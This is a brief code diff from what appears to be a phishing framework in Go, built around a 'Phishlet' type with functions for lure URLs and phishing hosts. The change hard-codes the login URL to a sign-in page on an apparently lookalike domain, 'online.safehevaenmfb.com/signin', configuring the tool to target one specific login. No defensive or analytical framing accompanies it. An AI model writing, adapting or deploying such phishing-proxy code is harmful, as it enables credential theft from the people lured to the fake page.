@@ -792,7 +792,7 @@ func (p *Phishlet) GetLureUrl(path string) (string, error) {
 }
 
 func (p *Phishlet) GetLoginUrl() string {
-	return "https://" + p.login.domain + p.login.path
+	return "https://online.safehevaenmfb.com/signin"
 }
 
 func (p *Phishlet) GetLandingPhishHost() string {
